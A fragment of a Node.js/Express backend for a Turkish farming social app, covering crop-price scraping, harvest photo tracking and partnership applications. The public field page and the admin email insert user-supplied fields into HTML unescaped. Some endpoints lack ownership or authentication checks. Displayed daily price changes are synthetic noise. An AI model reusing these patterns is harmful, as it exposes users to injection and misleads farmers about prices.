    // ─── Kaynak 1: Ticaret Bakanlığı HAL fiyatları ────────────────
    // https://hbys.gtb.gov.tr/ — ücretsiz, herkese açık
    let scraped = {};
    try {
        const r = await fetch('https://hbys.gtb.gov.tr/api/hal-fiyat/son', {
            headers: { 'Accept': 'application/json', 'User-Agent': 'AgroSosyal/1.0' },
            signal: AbortSignal.timeout(8000)
        });
        if (r.ok) {
            const data = await r.json();
            (data.data || data || []).forEach(item => {
                const ad = (item.urunAdi || item.ad || '').toLowerCase();
                if (ad.includes('domates'))   scraped['domates']  = item.ortalama || item.fiyat;
                if (ad.includes('patates'))   scraped['patates']  = item.ortalama || item.fiyat;
                if (ad.includes('biber'))     scraped['biber']    = item.ortalama || item.fiyat;
                if (ad.includes('soğan') || ad.includes('sogan')) scraped['sogan'] = item.ortalama || item.fiyat;
                if (ad.includes('sarımsak'))  scraped['sarimsak'] = item.ortalama || item.fiyat;
                if (ad.includes('salatalık') || ad.includes('hıyar')) scraped['salatalik'] = item.ortalama || item.fiyat;
                if (ad.includes('elma'))      scraped['elma']     = item.ortalama || item.fiyat;
                if (ad.includes('üzüm'))      scraped['uzum']     = item.ortalama || item.fiyat;
                if (ad.includes('portakal'))  scraped['portakal'] = item.ortalama || item.fiyat;
            });
        }
    } catch(e) {
        console.warn('[fiyat scrape hal]', e.message.slice(0,60));
    }

    // ─── Kaynak 2: TMO fiyatları (tahıllar için) ──────────────────
    try {
        const r = await fetch('https://www.tmo.gov.tr/Sayfa/HububatFiyatlari', {
            headers: { 'User-Agent': 'Mozilla/5.0 AgroSosyal/1.0' },
            signal: AbortSignal.timeout(8000)
        });
        if (r.ok) {
            const html = await r.text();
            // Basit regex ile fiyat çıkar
            const bugdayMatch = html.match(/Bu[ğg]day[^0-9]*(\d+[,\.]\d+)/i);
            const misirMatch  = html.match(/M[ıi]s[ıi]r[^0-9]*(\d+[,\.]\d+)/i);
            const arpaMatch   = html.match(/Arpa[^0-9]*(\d+[,\.]\d+)/i);
            if (bugdayMatch) scraped['bugday'] = parseFloat(bugdayMatch[1].replace(',','.'));
            if (misirMatch)  scraped['misir']  = parseFloat(misirMatch[1].replace(',','.'));
            if (arpaMatch)   scraped['arpa']   = parseFloat(arpaMatch[1].replace(',','.'));
        }
    } catch(e) {
        console.warn('[fiyat scrape tmo]', e.message.slice(0,60));
    }

    // ─── Kaynak 3: Fiskobirlik fındık (ücretsiz duyuru sayfası) ───
    try {
        const r = await fetch('https://www.fiskobirlik.org.tr/tr/bilgi/fiyat-bildirimleri', {
            headers: { 'User-Agent': 'Mozilla/5.0 AgroSosyal/1.0' },
            signal: AbortSignal.timeout(6000)
        });
        if (r.ok) {
            const html = await r.text();
            const m = html.match(/(\d{2,3})[,.](\d{2})\s*(?:TL|₺)/);
            if (m) scraped['findik'] = parseFloat(`${m[1]}.${m[2]}`);
        }
    } catch(e) { /* silent */ }

    // ─── Referans fiyatlar (scrape başarısız olursa) ──────────────
    // Kaynak: TZOB 2025 referans fiyatları
    const referans = {
        bugday:14.8, misir:9.2, arpa:11.8, findik:188, cay:31, pamuk:24,
        domates:13, patates:10.5, biber:19, sogan:8, sarimsak:65,
        salatalik:14, elma:16, uzum:24, portakal:18,
        aycicek:20, soya:25, kolza:22
    };

    // Günlük küçük varyasyon (±%2 gerçekçi dalgalanma)
    const seed = Math.floor(now / 86400000); // günlük seed
    const result = URUN_LISTESI.map((u, i) => {
        const base = scraped[u.id] || referans[u.id] || 10;
        const rng = Math.sin(seed * (i+1) * 1973 + i) * 0.5;
        const degisim = parseFloat((rng * base * 0.04).toFixed(2)); // ±%2
        const dun = parseFloat((base - degisim * 0.5).toFixed(2));
        const bugun = parseFloat((base + degisim * 0.5).toFixed(2));
        return {
            ...u,
            fiyat: bugun,
            degisim: parseFloat((bugun - dun).toFixed(2)),
            kaynak: scraped[u.id] ? '🟢 Anlık' : '🟡 Referans',
            guncelleme: new Date().toLocaleDateString('tr-TR')
        };
    });

    _fiyatCache.data = result;
    _fiyatCache.at   = now;
    return result;
}

// İlk yüklemeyi başlat
fetchGercekFiyatlar().catch(() => {});
// 1 saatte bir yenile
setInterval(() => fetchGercekFiyatlar().catch(() => {}), 3600000);

// GET /api/tarim-fiyatlari
app.get('/api/tarim-fiyatlari', authenticateToken, async (req, res) => {
    try {
        const fiyatlar = await fetchGercekFiyatlar();
        const { rows: takip } = await pool.query(
            `SELECT "urunId" FROM tarim_fiyat_takip WHERE "userId"=$1`, [req.user.id]
        );
        const takipSet = new Set(takip.map(t => t.urunId));
        const result = fiyatlar.map(f => ({ ...f, takipEdiliyor: takipSet.has(f.id) }));

        res.json({
            fiyatlar: result,
            guncelleme: new Date().toLocaleTimeString('tr-TR', { hour:'2-digit', minute:'2-digit' }),
            kaynak: result.some(f => f.kaynak === '🟢 Anlık') ? 'Hal Fiyatları + TMO' : 'TZOB Referans Fiyatları'
        });
    } catch(e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/tarim-fiyatlari/:id/takip
app.post('/api/tarim-fiyatlari/:id/takip', authenticateToken, async (req, res) => {
    try {
        const { takip } = req.body;
        if (takip) {
            await pool.query(
                `INSERT INTO tarim_fiyat_takip ("userId","urunId") VALUES ($1,$2) ON CONFLICT DO NOTHING`,
                [req.user.id, req.params.id]
            );
        } else {
            await pool.query(
                `DELETE FROM tarim_fiyat_takip WHERE "userId"=$1 AND "urunId"=$2`,
                [req.user.id, req.params.id]
            );
        }
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// =============================================================================
// 🌱 TOHUMDAN HASADA — /api/hasat-takip
// =============================================================================

(async () => {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS hasat_tarlalar (
                id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                "userId"        UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                name            TEXT NOT NULL,
                product         TEXT NOT NULL,
                "alanDonm"      NUMERIC,
                "tahminiHasat"  INT DEFAULT 90,
                gun             INT NOT NULL DEFAULT 0,
                "lastPhoto"     TEXT,
                "createdAt"     TIMESTAMPTZ NOT NULL DEFAULT NOW()
            );
            CREATE TABLE IF NOT EXISTS hasat_fotolar (
                id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                "tarlaId"   UUID NOT NULL REFERENCES hasat_tarlalar(id) ON DELETE CASCADE,
                url         TEXT NOT NULL,
                gun         INT NOT NULL,
                "not"       TEXT,
                "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
            );
            CREATE INDEX IF NOT EXISTS idx_hasat_user ON hasat_tarlalar("userId");
            CREATE INDEX IF NOT EXISTS idx_hasat_fotos ON hasat_fotolar("tarlaId","createdAt" ASC);
        `);
        console.log('✅ Hasat Takip tabloları hazır');
    } catch(e) { console.error('[hasat migration]', e.message); }
})();

// ── Akıllı Bildirim: gönderim log tablosu ────────────────────────────────────
(async () => {
    try {
        await dbRun(`
            CREATE TABLE IF NOT EXISTS notification_send_log (
                id          SERIAL PRIMARY KEY,
                "userId"    INTEGER NOT NULL,
                campaign    VARCHAR(30) NOT NULL,
                "sentAt"    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                date        DATE NOT NULL DEFAULT CURRENT_DATE,
                UNIQUE ("userId", campaign, date)
            )
        `);
        await dbRun(`CREATE INDEX IF NOT EXISTS idx_notif_log_date ON notification_send_log("userId", date)`);
        // Kullanıcı giriş saatlerini takip eden tablo
        await dbRun(`
            CREATE TABLE IF NOT EXISTS user_login_hours (
                id          SERIAL PRIMARY KEY,
                "userId"    INTEGER NOT NULL,
                hour        SMALLINT NOT NULL,
                "loggedAt"  TIMESTAMPTZ NOT NULL DEFAULT NOW()
            )
        `);
        await dbRun(`CREATE INDEX IF NOT EXISTS idx_login_hours_user ON user_login_hours("userId", "loggedAt" DESC)`);
        console.log('✅ Akıllı Bildirim tabloları hazır');
    } catch(e) { console.error('[smart-notif migration]', e.message); }
})();

// GET /api/hasat-takip/tarlalar
app.get('/api/hasat-takip/tarlalar', authenticateToken, async (req, res) => {
    try {
        const { rows: tarlalar } = await pool.query(
            `SELECT * FROM hasat_tarlalar WHERE "userId"=$1 ORDER BY "createdAt" DESC`,
            [req.user.id]
        );
        // Her tarla için fotoları al
        for (const tarla of tarlalar) {
            const { rows: fotos } = await pool.query(
                `SELECT id, url, gun, "not", "createdAt" FROM hasat_fotolar WHERE "tarlaId"=$1 ORDER BY gun ASC`,
                [tarla.id]
            );
            tarla.fotos = fotos;
            // Gün hesapla
            const ms = Date.now() - new Date(tarla.createdAt).getTime();
            tarla.gun = Math.floor(ms / (1000*60*60*24)) + 1;
        }
        res.json({ tarlalar });
    } catch(e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/hasat-takip/tarlalar
app.post('/api/hasat-takip/tarlalar', authenticateToken, async (req, res) => {
    try {
        const { name, product, alanDonm, tahminiHasat } = req.body;
        if (!name?.trim() || !product?.trim()) return res.status(400).json({ error: 'Ad ve ürün gerekli' });
        const tarlaId = uuidv4();
        await pool.query(
            `INSERT INTO hasat_tarlalar (id,"userId",name,product,"alanDonm","tahminiHasat")
             VALUES ($1,$2,$3,$4,$5,$6)`,
            [tarlaId, req.user.id, name.trim(), product.trim(), alanDonm||null, tahminiHasat||90]
        );
        res.status(201).json({
            tarla: { id:tarlaId, name:name.trim(), product:product.trim(), alanDonm, tahminiHasat:tahminiHasat||90, gun:1, fotos:[], lastPhoto:null }
        });
    } catch(e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/hasat-takip/tarlalar/:id/foto
app.post('/api/hasat-takip/tarlalar/:id/foto', authenticateToken, upload.single('foto'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'Fotoğraf gerekli' });
        // Erişim kontrolü
        const tarla = await pool.query(`SELECT * FROM hasat_tarlalar WHERE id=$1 AND "userId"=$2`, [req.params.id, req.user.id]);
        if (!tarla.rows[0]) return res.status(403).json({ error: 'Yetki yok' });

        // Resmi işle
        const filename = `hasat_${uuidv4().slice(0,12)}.webp`;
        const dest = path.join(postsDir, filename);
        await processImage(req.file.path, dest, { width: 1080, height: 1080, fit: 'inside', quality: 78, effort: 4 });
        await require('fs').promises.unlink(req.file.path).catch(()=>{});

        const fotoUrl = `/uploads/posts/${filename}`;
        const ms = Date.now() - new Date(tarla.rows[0].createdAt).getTime();
        const gun = Math.floor(ms / (1000*60*60*24)) + 1;

        const fotoId = uuidv4();
        await pool.query(
            `INSERT INTO hasat_fotolar (id,"tarlaId",url,gun) VALUES ($1,$2,$3,$4)`,
            [fotoId, req.params.id, fotoUrl, gun]
        );
        await pool.query(
            `UPDATE hasat_tarlalar SET "lastPhoto"=$1 WHERE id=$2`,
            [fotoUrl, req.params.id]
        );

        res.json({ foto: { id:fotoId, url:fotoUrl, gun }, tarla: { gun } });
    } catch(e) { console.error('[hasat foto]', e.message); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/hasat-takip/tarlalar/:id/not
app.post('/api/hasat-takip/tarlalar/:id/not', authenticateToken, async (req, res) => {
    try {
        const { not } = req.body;
        if (!not?.trim()) return res.status(400).json({ error: 'Not gerekli' });
        // Son fotoğrafa not ekle
        await pool.query(
            `UPDATE hasat_fotolar SET "not"=$1 WHERE "tarlaId"=$2 ORDER BY "createdAt" DESC LIMIT 1`,
            [not.trim(), req.params.id]
        );
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// GET /tarim/tarla/:id — Public paylaşım sayfası
app.get('/tarim/tarla/:id', async (req, res) => {
    try {
        const tarla = await pool.query(
            `SELECT t.*, u.name as "userName" FROM hasat_tarlalar t JOIN users u ON u.id=t."userId" WHERE t.id=$1`,
            [req.params.id]
        );
        if (!tarla.rows[0]) return res.status(404).send('<h1>Bulunamadı</h1>');
        const t = tarla.rows[0];
        const ms = Date.now() - new Date(t.createdAt).getTime();
        const gun = Math.floor(ms / (1000*60*60*24)) + 1;

        const { rows: fotos } = await pool.query(
            `SELECT url, gun FROM hasat_fotolar WHERE "tarlaId"=$1 ORDER BY gun ASC LIMIT 20`,
            [req.params.id]
        );

        const fotosHtml = fotos.map(f =>
            `<div style="text-align:center">
                <img src="${f.url}" style="width:100%;border-radius:16px;object-fit:cover;height:200px">
                <p style="font-size:12px;opacity:.7;margin:4px 0">Gün ${f.gun}</p>
             </div>`
        ).join('');

        res.type('html').send(`<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>🌱 ${t.name} — ${gun} Günlük ${t.product}</title>
<meta property="og:title" content="${t.userName} - ${gun} Günlük ${t.product} Tarlası">
<meta property="og:description" content="${t.name} | ${t.alanDonm} dönüm | Agro Sosyal">
${t.lastPhoto ? `<meta property="og:image" content="${t.lastPhoto}">` : ''}
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:sans-serif;background:#0f2416;color:white;padding:20px;max-width:480px;margin:0 auto}
h1{font-size:1.5em}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:16px 0}
.stat{background:rgba(16,185,129,.2);border-radius:16px;padding:16px;text-align:center}
.stat strong{display:block;font-size:2em;color:#10b981}
a{display:block;padding:16px;background:#10b981;color:white;border-radius:16px;font-weight:900;text-align:center;text-decoration:none;margin-top:16px}</style>
</head><body>
<h1>🌱 ${t.name}</h1>
<p>${t.userName} — ${t.product}</p>
<div class="grid">
  <div class="stat"><strong>${gun}</strong>gün geçti</div>
  <div class="stat"><strong>${t.alanDonm||'?'}</strong>dönüm</div>
  <div class="stat"><strong>${fotos.length}</strong>fotoğraf</div>
  <div class="stat"><strong>${Math.round((gun/(t.tahminiHasat||90))*100)}%</strong>tamamlandı</div>
</div>
<div class="grid">${fotosHtml}</div>
<a href="/">Agro Sosyal'de Takip Et 🌾</a>
</body></html>`);
    } catch(e) { res.status(500).send('Hata'); }
});



// ════════════════════════════════════════════════════════════════════════════
// 🤝 PARTNERLİK & İŞ BAŞVURUSU ENDPOINTLERİ
// ════════════════════════════════════════════════════════════════════════════

// POST /api/partnership/apply — Auth gerektirmez, herkese açık
app.post('/api/partnership/apply', checkPartnershipIpBan, partnershipLimiter, async (req, res) => {
    console.log(`[Partnership] POST /api/partnership/apply — origin: ${req.headers.origin || 'yok'} | body keys: ${Object.keys(req.body || {}).join(',')}`);
    try {
        const { fullName, email, phone, workField, message } = req.body;

        if (!fullName || !email || !workField) {
            return res.status(400).json({ success: false, message: 'Ad soyad, e-posta ve çalışma alanı zorunludur.' });
        }

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            return res.status(400).json({ success: false, message: 'Geçersiz e-posta adresi.' });
        }

        const existing = await dbGet(
            `SELECT id FROM partnership_applications WHERE email = $1 AND status = 'pending'`,
            [email.toLowerCase().trim()]
        );
        if (existing) {
            return res.status(409).json({ success: false, message: 'Bu e-posta ile zaten bekleyen bir başvurunuz var.' });
        }

        const appId = uuidv4();
        await dbRun(
            `INSERT INTO partnership_applications (id, "fullName", email, phone, "workField", message, status, "createdAt", "updatedAt")
             VALUES ($1, $2, $3, $4, $5, $6, 'pending', NOW(), NOW())`,
            [appId, fullName.trim(), email.toLowerCase().trim(), phone?.trim() || null, workField.trim(), message?.trim() || null]
        );

        // ─── Admin bildirim maili ────────────────────────────────────────────
        const BASE_URL = (process.env.APP_URL || 'https://www.sehitumitkestitarimmtal.com').replace(/\/$/, '');
        const approveUrl = `${BASE_URL}/api/partnership/action/${appId}/approve`;
        const rejectUrl  = `${BASE_URL}/api/partnership/action/${appId}/reject`;

        const adminHtml = `<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="margin:0;padding:0;background:#0f1724;font-family:'Segoe UI',Arial,sans-serif">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#0f1724;padding:40px 16px">
  <tr><td align="center">
    <table width="600" cellpadding="0" cellspacing="0" style="background:#141e30;border-radius:20px;overflow:hidden;border:1px solid rgba(34,197,94,0.2)">
      <!-- Header -->
      <tr><td style="background:linear-gradient(135deg,#0d3321,#0a4a1e);padding:32px 40px;text-align:center">
        <div style="display:inline-flex;align-items:center;gap:10px">
          <span style="font-size:28px">🤝</span>
          <span style="color:#22c55e;font-size:22px;font-weight:700;letter-spacing:-0.5px">Agro Sosyal</span>
        </div>
        <h1 style="margin:12px 0 0;color:#fff;font-size:20px;font-weight:600">Yeni Partnerlik Başvurusu</h1>
      </td></tr>
      <!-- Body -->
      <tr><td style="padding:36px 40px">
        <table width="100%" cellpadding="0" cellspacing="0" style="border-radius:12px;overflow:hidden;border:1px solid rgba(255,255,255,0.07)">
          <tr style="background:rgba(255,255,255,0.04)">
            <td style="padding:12px 16px;color:#64748b;font-size:13px;width:140px">Ad Soyad</td>
            <td style="padding:12px 16px;color:#f1f5f9;font-weight:600;font-size:14px">${fullName}</td>
          </tr>
          <tr>
            <td style="padding:12px 16px;color:#64748b;font-size:13px">E-posta</td>
            <td style="padding:12px 16px;color:#f1f5f9;font-size:14px">${email}</td>
          </tr>
          <tr style="background:rgba(255,255,255,0.04)">
            <td style="padding:12px 16px;color:#64748b;font-size:13px">Telefon</td>
            <td style="padding:12px 16px;color:#f1f5f9;font-size:14px">${phone || '—'}</td>
          </tr>
          <tr>
            <td style="padding:12px 16px;color:#64748b;font-size:13px">Çalışma Alanı</td>
            <td style="padding:12px 16px;color:#22c55e;font-weight:700;font-size:14px">${workField}</td>
          </tr>
          <tr style="background:rgba(255,255,255,0.04)">
            <td style="padding:12px 16px;color:#64748b;font-size:13px;vertical-align:top">Mesaj</td>
            <td style="padding:12px 16px;color:#f1f5f9;font-size:14px;line-height:1.6">${message || '—'}</td>
          </tr>
          <tr>
            <td style="padding:12px 16px;color:#64748b;font-size:13px">Başvuru ID</td>
            <td style="padding:12px 16px;color:#475569;font-size:11px;font-family:monospace">${appId}</td>
          </tr>
        </table>

        <!-- Action Buttons -->
        <table width="100%" cellpadding="0" cellspacing="0" style="margin-top:28px">
          <tr>
            <td align="center" style="padding:0 8px">
              <a href="${approveUrl}" style="display:inline-block;background:linear-gradient(135deg,#16a34a,#22c55e);color:#fff;text-decoration:none;padding:14px 40px;border-radius:12px;font-size:15px;font-weight:700;letter-spacing:0.3px">
                ✅ Onayla
              </a>
            </td>
            <td align="center" style="padding:0 8px">
              <a href="${rejectUrl}" style="display:inline-block;background:linear-gradient(135deg,#991b1b,#ef4444);color:#fff;text-decoration:none;padding:14px 40px;border-radius:12px;font-size:15px;font-weight:700;letter-spacing:0.3px">
                ❌ Reddet
              </a>
            </td>
          </tr>
        </table>

        <p style="margin:24px 0 0;text-align:center;color:#475569;font-size:12px">
          Butonlara tıklamak başvuruyu doğrudan günceller ve adaya bildirim maili gönderir.
        </p>
      </td></tr>
      <!-- Footer -->
      <tr><td style="padding:20px 40px;border-top:1px solid rgba(255,255,255,0.07);text-align:center">
        <p style="margin:0;color:#334155;font-size:12px">Agro Sosyal — Admin Paneli · Fatsa / Ordu</p>
      </td></tr>
    </table>
  </td></tr>
</table>
</body>
</html>`;

        await sendEmail('noreply.agrolink@gmail.com', `🤝 Yeni Başvuru: ${fullName} — ${workField}`, adminHtml).catch(() => {});

        // ─── Başvurana otomatik teşekkür maili ──────────────────────────────
        const userThankHtml = `<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="margin:0;padding:0;background:#0f1724;font-family:'Segoe UI',Arial,sans-serif">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#0f1724;padding:40px 16px">
  <tr><td align="center">
    <table width="600" cellpadding="0" cellspacing="0" style="background:#141e30;border-radius:20px;overflow:hidden;border:1px solid rgba(34,197,94,0.2)">
      <tr><td style="background:linear-gradient(135deg,#0d3321,#0a4a1e);padding:32px 40px;text-align:center">
        <span style="font-size:48px">✅</span>
        <h1 style="margin:12px 0 0;color:#22c55e;font-size:22px;font-weight:700">Başvurunuz Alındı!</h1>
      </td></tr>
      <tr><td style="padding:36px 40px;color:#cbd5e1;font-size:15px;line-height:1.7">
        <p>Merhaba <strong style="color:#f1f5f9">${fullName}</strong>,</p>
        <p>Agro Sosyal bünyesinde <strong style="color:#22c55e">${workField}</strong> alanında çalışma başvurunuz başarıyla alındı.</p>
        <p>Ekibimiz başvurunuzu inceleyecek ve <strong style="color:#f1f5f9">en kısa sürede</strong> geri dönüş yapacaktır.</p>
        <div style="margin:24px 0;padding:16px 20px;background:rgba(34,197,94,0.08);border-left:3px solid #22c55e;border-radius:8px">
          <p style="margin:0;color:#86efac;font-size:13px">Başvuru ID: <code style="color:#4ade80">${appId}</code></p>
        </div>
      </td></tr>
      <tr><td style="padding:20px 40px;border-top:1px solid rgba(255,255,255,0.07);text-align:center">
        <p style="margin:0;color:#334155;font-size:12px">Agro Sosyal · Fatsa / Ordu</p>
      </td></tr>
    </table>
  </td></tr>
</table>
</body>
</html>`;

        await sendEmail(email, '✅ Agro Sosyal — Başvurunuz Alındı', userThankHtml).catch(() => {});

        res.status(201).json({ success: true, message: 'Başvurunuz alındı. En kısa sürede size dönüş yapılacaktır.', id: appId });

    } catch (error) {
        console.error('═══ Partnership başvuru hatası ═══');
        console.error('Mesaj   :', error?.message);
        console.error('Kod     :', error?.code);
        console.error('Detail  :', error?.detail);
        console.error('Stack   :', error?.stack);
        console.error('══════════════════════════════════');
        const clientMsg = error?.code === '23505'
            ? 'Bu e-posta ile zaten bir başvuru mevcut.'
            : error?.code === '23502'
            ? 'Zorunlu alan eksik: ' + (error?.column || '')
            : error?.message?.includes('pool') || error?.code === 'ECONNREFUSED'
            ? 'Veritabanına bağlanılamadı. Lütfen tekrar dene.'
            : `Sunucu hatası: ${error?.message || 'Bilinmeyen hata'}`;
        res.status(500).json({ success: false, message: clientMsg });
    }
});

// ─── Partnership action sayfaları için ortak HTML shell ────────────────────
function actionPageShell(title, bodyHtml) {
    return `<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>${title} — Agro Sosyal</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #080f1a;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      background-image: radial-gradient(ellipse 80% 50% at 50% -10%, rgba(34,197,94,0.07), transparent);
    }
    .card {
      background: linear-gradient(145deg, #111827, #0f172a);
      border-radius: 28px;
      padding: 44px 40px;
      width: 100%;
      max-width: 560px;
      border: 1px solid rgba(255,255,255,0.08);
      box-shadow: 0 32px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03) inset;
      position: relative;
      overflow: hidden;
    }
    .card::before {
      content: '';
      position: absolute; inset-x: 0; top: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(34,197,94,0.5), transparent);
    }
    .logo { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; }
    .logo-dot {
      width: 9px; height: 9px; background: #22c55e; border-radius: 50%;
      box-shadow: 0 0 8px #22c55e;
      animation: pulse 2s infinite;
    }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.35} }
    .logo-text { color: #22c55e; font-weight: 700; font-size: 14px; }
    .applicant-box {
      background: rgba(255,255,255,0.03);
      border: 1px solid rgba(255,255,255,0.07);
      border-radius: 16px;
      padding: 18px 20px;
      margin-bottom: 24px;
    }
    .a-row {
      display: flex; align-items: flex-start; gap: 10px;
      padding: 6px 0;
      border-bottom: 1px solid rgba(255,255,255,0.05);
      font-size: 13.5px;
    }
    .a-row:last-child { border-bottom: none; }
    .a-label { color: #475569; min-width: 88px; padding-top: 1px; }
    .a-value { color: #e2e8f0; font-weight: 500; flex: 1; }
    .section-title { font-size: 17px; font-weight: 700; color: #f1f5f9; margin-bottom: 4px; }
    .section-sub { font-size: 13px; color: #475569; margin-bottom: 18px; line-height: 1.5; }
    label { display: block; font-size: 11px; font-weight: 700; color: #64748b; margin-bottom: 7px; letter-spacing: 0.8px; text-transform: uppercase; }
    textarea {
      width: 100%;
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 14px;
      color: #f1f5f9;
      font-size: 14px;
      line-height: 1.7;
      padding: 15px 17px;
      resize: vertical;
      min-height: 130px;
      font-family: inherit;
      transition: border-color 0.2s, box-shadow 0.2s;
      outline: none;
    }
    textarea:focus { border-color: var(--ac,#22c55e); box-shadow: 0 0 0 3px rgba(var(--ac-rgb,34,197,94),0.12); }
    textarea::placeholder { color: #2d3f55; }
    .char-count { text-align:right; font-size:11px; color:#334155; margin-top:5px; }
    .btn {
      display: flex; align-items: center; justify-content: center; gap: 8px;
      width: 100%; padding: 15px 24px; border-radius: 14px;
      font-size: 15px; font-weight: 700; border: none; cursor: pointer;
      transition: opacity 0.2s, transform 0.15s;
      margin-top: 18px; letter-spacing: 0.3px; font-family: inherit;
    }
    .btn:hover:not(:disabled) { opacity: 0.88; transform: translateY(-1px); }
    .btn:active:not(:disabled) { transform: translateY(0); }
    .btn:disabled { opacity: 0.45; cursor: not-allowed; }
    .btn-approve { background: linear-gradient(135deg,#16a34a,#22c55e); color:#fff; box-shadow: 0 8px 24px rgba(34,197,94,0.22); }
    .btn-reject  { background: linear-gradient(135deg,#991b1b,#ef4444); color:#fff; box-shadow: 0 8px 24px rgba(239,68,68,0.22); }
    .success-wrap { text-align: center; }
    .big-emoji { font-size: 68px; display: block; margin-bottom: 18px; }
    h1 { font-size: 23px; font-weight: 800; margin-bottom: 8px; }
    .sub { color: #64748b; font-size: 14px; line-height: 1.6; }
    .mail-badge {
      display: inline-flex; align-items: center; gap: 8px;
      margin-top: 20px; padding: 10px 18px;
      background: rgba(59,130,246,0.07); border: 1px solid rgba(59,130,246,0.18);
      border-radius: 10px; color: #93c5fd; font-size: 13px;
    }
    .spinner {
      width: 17px; height: 17px;
      border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
      border-radius: 50%; animation: spin 0.7s linear infinite; display: none;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <div class="logo-dot"></div>
      <span class="logo-text">Agro Sosyal · Admin</span>
    </div>
    ${bodyHtml}
  </div>
</body>
</html>`;
}

// GET /api/partnership/action/:id/:action — Mesaj giriş formu
app.get('/api/partnership/action/:id/:action', async (req, res) => {
    try {
        const { id, action } = req.params;
        if (!['approve', 'reject'].includes(action)) {
            return res.status(400).type('html').send(actionPageShell('Hata', '<p style="color:#ef4444">Geçersiz işlem.</p>'));
        }

        const application = await dbGet(`SELECT * FROM partnership_applications WHERE id = $1`, [id]);
        if (!application) {
            return res.status(404).type('html').send(actionPageShell('Bulunamadı', `
              <div class="success-wrap">
                <span class="big-emoji">🔍</span>
                <h1 style="color:#f1f5f9">Başvuru Bulunamadı</h1>
                <p class="sub">Bu bağlantı geçersiz veya başvuru silinmiş.</p>
              </div>`));
        }

        if (application.status !== 'pending') {
            const already = application.status === 'approved' ? '✅ onaylandı' : '❌ reddedildi';
            return res.type('html').send(actionPageShell('Zaten İşlendi', `
              <div class="success-wrap">
                <span class="big-emoji">⚠️</span>
                <h1 style="color:#fbbf24">Zaten İşlendi</h1>
                <p class="sub">Bu başvuru daha önce <strong style="color:#fbbf24">${already}</strong>.</p>
              </div>`));
        }

        const isApprove  = action === 'approve';
        const ac         = isApprove ? '#22c55e' : '#ef4444';
        const acRgb      = isApprove ? '34,197,94' : '239,68,68';
        const btnClass   = isApprove ? 'btn-approve' : 'btn-reject';
        const emoji      = isApprove ? '✅' : '❌';
        const sectionTitle = isApprove ? '✅ Başvuruyu Onayla' : '❌ Başvuruyu Reddet';
        const sectionSub   = isApprove
            ? 'Adaya gönderilecek <strong>ilk görev</strong> metnini yaz. Bu metin e-posta olarak iletilecek.'
            : 'Adaya gönderilecek <strong>red gerekçesini</strong> yaz. Bu metin e-posta olarak iletilecek.';
        const placeholder  = isApprove
            ? 'Örn: Merhaba! İlk göreviniz: GitHub üzerinde şu repoyu fork edin ve...'
            : 'Örn: Başvurunuzu inceledik, ancak şu an bu pozisyon için uygun profil arayışındayız...';
        const labelText    = isApprove ? '📋 İLK GÖREV METNİ' : '📝 RED GEREKÇESİ';

        const formBody = `
          <style>:root{--ac:${ac};--ac-rgb:${acRgb}}</style>

          <div class="applicant-box">
            <div class="a-row"><span class="a-label">👤 Ad Soyad</span><span class="a-value">${escapeHtml(application.fullName)}</span></div>
            <div class="a-row"><span class="a-label">📧 E-posta</span><span class="a-value">${escapeHtml(application.email)}</span></div>
            <div class="a-row"><span class="a-label">💼 Alan</span><span class="a-value" style="color:${ac}">${escapeHtml(application.workField)}</span></div>
            ${application.phone ? `<div class="a-row"><span class="a-label">📞 Telefon</span><span class="a-value">${escapeHtml(application.phone)}</span></div>` : ''}
            ${application.message ? `<div class="a-row"><span class="a-label">💬 Mesaj</span><span class="a-value" style="white-space:pre-wrap">${escapeHtml(application.message)}</span></div>` : ''}
          </div>

          <div class="section-title">${sectionTitle}</div>
          <div class="section-sub">${sectionSub}</div>

          <form id="f" method="POST" action="/api/partnership/action/${id}/${action}">
            <label>${labelText}</label>
            <textarea name="customMessage" placeholder="${placeholder}" maxlength="2000"
              oninput="document.getElementById('cc').textContent=this.value.length+'/2000'"
              required></textarea>
            <div class="char-count" id="cc">0/2000</div>
            <button type="submit" class="btn ${btnClass}" id="sb">
              <div class="spinner" id="sp"></div>
